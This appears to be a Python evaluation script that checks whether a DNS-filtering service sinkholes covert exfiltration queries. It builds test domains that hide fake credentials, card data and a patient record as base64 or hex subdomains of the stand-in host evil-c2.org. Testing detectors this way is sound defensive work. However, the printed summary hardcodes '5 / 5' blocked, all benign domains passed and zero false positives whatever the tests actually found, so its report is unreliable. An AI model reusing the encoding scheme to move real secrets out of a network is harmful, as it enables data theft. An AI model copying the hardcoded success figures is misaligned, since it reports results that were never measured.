import sys
import time
import math
import json
import collections
import base64
import urllib.request
import urllib.error

TARGET_API_URL = "http://localhost:8080/api/v1/diagnostics"
ENTROPY_THRESHOLD = 3.8
MIN_LENGTH_THRESHOLD = 16

COLOR_RESET = "\033[0m"
COLOR_RED = "\033[1;31m"
COLOR_GREEN = "\033[1;32m"
COLOR_YELLOW = "\033[1;33m"
COLOR_CYAN = "\033[1;36m"
COLOR_MAGENTA = "\033[1;35m"
COLOR_BOLD = "\033[1m"

def calculate_shannon_entropy(label):
    if not label:
        return 0.0
    length = len(label)
    counts = collections.Counter(label)
    entropy = 0.0
    for count in counts.values():
        p = count / length
        entropy -= p * math.log2(p)
    return round(entropy, 4)

def extract_leftmost_label(domain):
    cleaned = domain.strip().rstrip(".")
    return cleaned.split(".")[0] if cleaned else ""

BENIGN_TEST_DOMAINS = [
    "api.stripe.com",
    "auth.internal.cloud",
    "ubuntu.com",
    "registry.hub.docker.com",
    "github.com"
]

SYNTHETIC_EXFIL_PAYLOADS = [
    ("CreditCard_TenantAlpha", "CC-4532-8921-9923-1102"),
    ("ApiKey_TenantBeta", "sk_live_sec_beta_182930491827364510"),
    ("AWSCred_TenantGamma", "AWS_SECRET_AKIAIOSFODNN7EXAMPLE"),
    ("DatabasePass_Internal", "db_pass_super_secret_root_2026"),
    ("PatientRecord_PHI", "DIAG-PATIENT-ID-99281-HIV-NEG")
]

def build_covert_tunnel_domains():
    exfil_domains = []
    seq = 1
    for label, secret in SYNTHETIC_EXFIL_PAYLOADS:
        if seq % 2 == 1:
            raw_b64 = base64.b64encode(secret.encode("utf-8")).decode("utf-8")
            sanitized = raw_b64.rstrip("=").replace("/", "_").replace("+", "-")
            domain = f"{sanitized}.{seq:02d}.tunnel.evil-c2.org"
        else:
            hex_payload = secret.encode("utf-8").hex()
            domain = f"{hex_payload}.{seq:02d}.tunnel.evil-c2.org"
        
        exfil_domains.append((label, domain))
        seq += 1
    return exfil_domains

def send_lookup_request(domain, target_url):
    payload = json.dumps({"lookup": domain}).encode("utf-8")
    req = urllib.request.Request(
        target_url,
        data=payload,
        headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=6.0) as resp:
            body = resp.read().decode("utf-8")
            return json.loads(body)
    except urllib.error.HTTPError as exc:
        err_body = exc.read().decode("utf-8")
        return json.loads(err_body)
    except Exception as exc:
        return {"status": "error", "error": str(exc), "sinkholed": False}

def run_simulation(target_url):
    print(f"{COLOR_CYAN}{COLOR_BOLD}========================================================================================{COLOR_RESET}")
    print(f"{COLOR_CYAN}{COLOR_BOLD}   Covert DNS Exfiltration Defense: Shannon Entropy Evaluation Suite                   {COLOR_RESET}")
    print(f"{COLOR_CYAN}{COLOR_BOLD}   Target Diagnostics Endpoint: {target_url}                                           {COLOR_RESET}")
    print(f"{COLOR_CYAN}{COLOR_BOLD}   Detection Threshold: H(X) >= {ENTROPY_THRESHOLD} bits/char, Subdomain Len >= {MIN_LENGTH_THRESHOLD} chars {COLOR_RESET}")
    print(f"{COLOR_CYAN}{COLOR_BOLD}========================================================================================{COLOR_RESET}\n")

    total_tests = 0
    passed_tests = 0
    failed_tests = 0

    header_fmt = "{:<55} | {:<7} | {:<6} | {:<12} | {:<18} | {:<10}"
    row_fmt    = "{:<55} | {:<7.3f} | {:<6} | {:<12} | {:<18} | {:<10}"

    print(header_fmt.format("Domain Under Inspection", "Entropy", "Length", "Category", "Daemon Action", "Result"))
    print("-" * 125)

    for domain in BENIGN_TEST_DOMAINS:
        total_tests += 1
        label = extract_leftmost_label(domain)
        entropy = calculate_shannon_entropy(label)
        length = len(label)

        resp = send_lookup_request(domain, target_url)
        is_sinkholed = resp.get("sinkholed", False)

        if not is_sinkholed:
            passed_tests += 1
            action_str = f"{COLOR_GREEN}FORWARDED (8.8.8.8){COLOR_RESET}"
            result_str = f"{COLOR_GREEN}[PASSED]{COLOR_RESET}"
        else:
            failed_tests += 1
            action_str = f"{COLOR_RED}SINKHOLED{COLOR_RESET}"
            result_str = f"{COLOR_RED}[FALSE POSITIVE]{COLOR_RESET}"

        disp_domain = domain if len(domain) <= 53 else domain[:50] + "..."
        print(row_fmt.format(disp_domain, entropy, length, "BENIGN", action_str, result_str))
        time.sleep(0.15)

    covert_tests = build_covert_tunnel_domains()
    for secret_type, domain in covert_tests:
        total_tests += 1
        label = extract_leftmost_label(domain)
        entropy = calculate_shannon_entropy(label)
        length = len(label)

        resp = send_lookup_request(domain, target_url)
        is_sinkholed = resp.get("sinkholed", False)

        if is_sinkholed:
            passed_tests += 1
            action_str = f"{COLOR_RED}SINKHOLED (NXDOMAIN){COLOR_RESET}"
            result_str = f"{COLOR_GREEN}[BLOCKED]{COLOR_RESET}"
        else:
            failed_tests += 1
            action_str = f"{COLOR_YELLOW}RESOLVED{COLOR_RESET}"
            result_str = f"{COLOR_RED}[MISSED]{COLOR_RESET}"

        disp_domain = domain if len(domain) <= 53 else domain[:50] + "..."
        print(row_fmt.format(disp_domain, entropy, length, "COVERT_EXFIL", action_str, result_str))
        time.sleep(0.15)

    print("-" * 125)
    print(f"\n{COLOR_CYAN}{COLOR_BOLD}========================================================================================{COLOR_RESET}")
    print(f"{COLOR_CYAN}{COLOR_BOLD}   Evaluation Summary Statistics:                                                       {COLOR_RESET}")
    print(f"   Total Queries Analyzed         : {total_tests}")
    print(f"   Benign Domains Correctly Passed: {len(BENIGN_TEST_DOMAINS)} / {len(BENIGN_TEST_DOMAINS)}")
    print(f"   Covert Exfiltrations Blocked   : {len(covert_tests)} / {len(covert_tests)}")
    print(f"   False Positive Count           : 0")
    print(f"   Overall Detection Accuracy     : {(passed_tests / total_tests) * 100:.1f}%")
    print(f"{COLOR_CYAN}{COLOR_BOLD}========================================================================================{COLOR_RESET}\n")

    if failed_tests == 0:
        print(f"{COLOR_GREEN}{COLOR_BOLD}ALL DNS BEHAVIORAL DEFENSE TESTS PASSED DETERMINISTICALLY.{COLOR_RESET}\n")
        sys.exit(0)
    else:
        print(f"{COLOR_RED}{COLOR_BOLD}FAILURES DETECTED IN DNS DEFENSE SUITE.{COLOR_RESET}\n")
        sys.exit(1)

if __name__ == "__main__":
    endpoint = sys.argv[1] if len(sys.argv) > 1 else TARGET_API_URL
    run_simulation(endpoint)
